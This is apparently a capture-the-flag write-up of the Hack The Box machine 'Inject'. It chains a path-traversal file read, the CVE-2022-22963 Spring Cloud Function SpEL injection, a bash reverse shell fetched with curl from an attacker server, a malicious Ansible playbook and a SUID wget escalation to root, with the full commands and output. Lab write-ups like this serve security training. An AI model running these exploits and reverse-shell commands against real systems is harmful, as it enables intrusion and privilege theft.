# Inject - HTB(Easy)
## IP = 10.129.183.48

### NMAP

```
PORT     STATE SERVICE     VERSION                                                                                                            
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)              
|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)   
|_  256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA                      
|_http-title: Home                                                                                             
| http-methods:                                                       
|_  Supported Methods: GET HEAD OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


### Enumeration

So when entering the website page you can see at the top right corner a link to an upload page, over there it seems you can upload an image, when trying to upload a non image extension it's not allowing the upload, so I said to myself let's check how it looks with a real image first and if i'll be stuck i'll return to the upload function and see if there are any vulnerabilities. So I uploaded an image and it gave me a link when entering the link you can see the following: 

`http://10.129.187.33:8080/show_image?img=<image>`

So I instantly thought about LFI because the image is a GET request. I tried some common LFI payloads and nothing worked so I tried the following 

`http://10.129.187.33:8080/show_image?img=../../../../../../usr/share/plymouth/ubuntu-logo.png`

And it worked so there is LFI but we got that image filtering. Now it's just figuring out how to bypass that filtering, so open BurpSuite and intercept that image request, you'll see the following header:

`Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8`

So I guessed thats there way of filtering, so if we just remove `image/avif,image/webp` and then try the LFI payloads it will work perfectly. Alternatively, you can run the request with `curl` and it work great because with curl you don't use headers.

```
$ curl -s 'http://10.129.187.33:8080/show_image?img=../../../../../../../../../../etc/passwd' | grep "bash"
root:x:0:0:root:/root:/bin/bash
frank:x:1000:1000:frank:/home/frank:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
```

After searching for a little bit I found the following:

```

$ curl -s 'http://10.10.11.204:8080/show_image?img=../../../../../../../../../home/frank/.m2/settings.xml'
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>

```

This is `phil`'s password: `DocPhillovestoInject123` but unfortunately it's a rabbit hole and the creds are not working. So I had to search more, I came through the `pom.xml` file, the pom is a sort of configuration file for the MAVEN project, in the file there are all sorts of frameworks and plugins with their versions. The interesting part in the `pom.xml` was the following: 


```

<dependency>
  <groupId>org.springframework.cloud</groupId>
  <artifactId>spring-cloud-function-web</artifactId>
  <version>3.2.2</version>
</dependency>

```

I searched for every framework version an exploit and I found this: CVE-2022-22963 - Spring Cloud RCE Vulnerability. The issue with CVE-2022-22963 is that it permits using HTTP request header spring.cloud.function.routing-expression parameter and SpEL expression to be injected and executed through StandardEvaluationContext. Exploiting the vulnerability is quite easy to accomplish. The following is the `curl` command need to be run to succeed with the exploit.

`$ curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("<command>")' --data-raw 'data' -v`

So now lets exploit. First we check if it works so we run:

`$ curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /dev/shm/pwned")' --data-raw 'data' -v`

```

curl -s 'http://10.10.11.204:8080/show_image?img=../../../../../../../../../../../dev/shm'
pwned
```

Great it works, now lets make a reverse shell. To do that we want to open a http server and download a shell file to the server then execute it with a lister to catch the call. 

```

$ curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("mkdir /dev/shm/new_dir")' --data-raw 'data' -v

$ echo "bash -i >& /dev/tcp/10.10.15.9/9081 0>&1" > shell.sh

(Window 1)$ python3 -m http.server 80
(Window 2)$ curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl http://10.10.15.9/shell.sh -o /dev/shm/new_dir/shell.sh")' --data-raw 'data' -v

(Window 1)$ nc -lnvp 9081
(Window 2)$ curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /dev/shm/new_dir/shell.sh")' --data-raw 'data' -v

connect to [10.10.15.9] from (UNKNOWN) [10.10.11.204] 49210
bash: cannot set terminal process group (786): Inappropriate ioctl for device
bash: no job control in this shell
frank@inject:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'

```

Now we have a shell. We can maybe try phil's credentials again:

```

frank@inject:/$ su phil
su phil
Password: DocPhillovestoInject123

phil@inject:/$ cat user.txt && id && whoami
abe54e02678da826fb19c5e30d2636db
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
phil

```

curl http://10.10.15.9/playbook_1.yml -o /opt/automation/tasks/playbook_2.yml


### PrivEsc

When trying to do all the regular sudo or suid check nothing seems to come up, so I opened `pspy` and looked. It seems that the machine is running automatically a command and it goes as follows: 

`/usr/bin/python3 /usr/bin/ansible-playbook /opt/automation/tasks/playbook_1.yml`

If the target system runs automation tasks with Ansible Playbook as root and we have write permission of task files (tasks/), we can inject arbitrary commands in yaml file.

So what I did is the following:

```
$ cat playbook_1.yml 
- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd:
      name: webapp
      enabled: yes
      state: started
  - name: Evil
    ansible.builtin.shell: |
      chmod +s /usr/bin/wget
    become: true
```
Created a copy of the file and added to it malicious code.

```
$ curl http://10.10.15.9/playbook_1.yml -o /opt/automation/tasks/playbook_2.yml
```

Uploaded to the shell. After that I waited, until the system will run the task as root, I knew when it ran after the malicious file was deleted.

```

$ ls -l /usr/bin/wget
-rwsr-sr-x 1 root root 544472 Nov 12  2021 /usr/bin/wget

```
After that I checked if it worked, and it did, `wget` is now a SUID. You may be wondering why I didn't make bash a suid, well the explanation is simple, it was already a suid, unfortunately someone beat me to root and got bash first, but it doesn't matter if want you can do bash it will be easier because after it's a SUID you can just run `bash -p` and you'll be root. So on to the `wget`, now that it's a suid you can go to GTFObins and copy the steps.

```

phil@inject:/opt/automation/tasks$ TF=$(mktemp)
phil@inject:/opt/automation/tasks$ chmod +x $TF
phil@inject:/opt/automation/tasks$ echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
phil@inject:/opt/automation/tasks$ /usr/bin/wget --use-askpass=$TF 0

# whoami && id && cat /root/root.txt
root
uid=1001(phil) gid=1001(phil) euid=0(root) egid=0(root) groups=0(root),50(staff),1001(phil)
ff6a3b8f5f811c416f14f25a747c913c

```

And BOOM! that was Inject. Thanks For tuning in. Cheers.